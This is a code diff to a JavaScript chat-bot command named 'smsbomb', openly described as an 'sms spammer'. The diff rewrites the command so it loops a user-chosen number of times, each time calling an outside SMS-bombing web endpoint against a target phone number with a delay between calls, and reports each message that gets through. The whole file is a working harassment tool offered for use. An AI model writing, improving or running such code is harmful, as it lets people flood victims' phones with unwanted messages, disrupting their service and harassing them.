@@ -4,7 +4,7 @@ module.exports.config = {
 	name: "smsbomb",
 	version: "1.0.0",
 	credits: "taichi/jenard", //wag niyo tatanggalin!!!
-	hasPrefix: false,
+	hasPrefix: true,
 	role: 2,
 	description: "sms spammer",
 	aliases: [],
@@ -23,14 +23,25 @@ module.exports.run = async function ({ event, args, api }) {
 	}
 
 	try {
-		const response = await axios.get(`https://deku-rest-api-ywad.onrender.com/smsb`, {
-			params: {
-				number: encodeURIComponent(number),
-				amount: encodeURIComponent(amount),
-				delay: encodeURIComponent(delay),
+		event.reply("Processing your request...");
+
+		let successCount = 0;
+		for (let i = 0; i < amount; i++) {
+			const response = await axios.get(`https://deku-rest-api-ywad.onrender.com/smsb`, {
+				params: {
+					number: encodeURIComponent(number),
+					delay: encodeURIComponent(delay),
+				}
+			});
+			if (response.data.success) {
+				successCount++;
+				event.reply(`${successCount} success sent`);
+			} else {
+				event.reply(`Failed to send SMS ${i + 1}`);
 			}
-		});
-		event.reply(response.data);
+			await new Promise(resolve => setTimeout(resolve, delay));
+		}
+		event.reply("All requests processed.");
 	} catch (error) {
 		console.error(error.message);
 		event.reply("An error occurred while sending the request.");
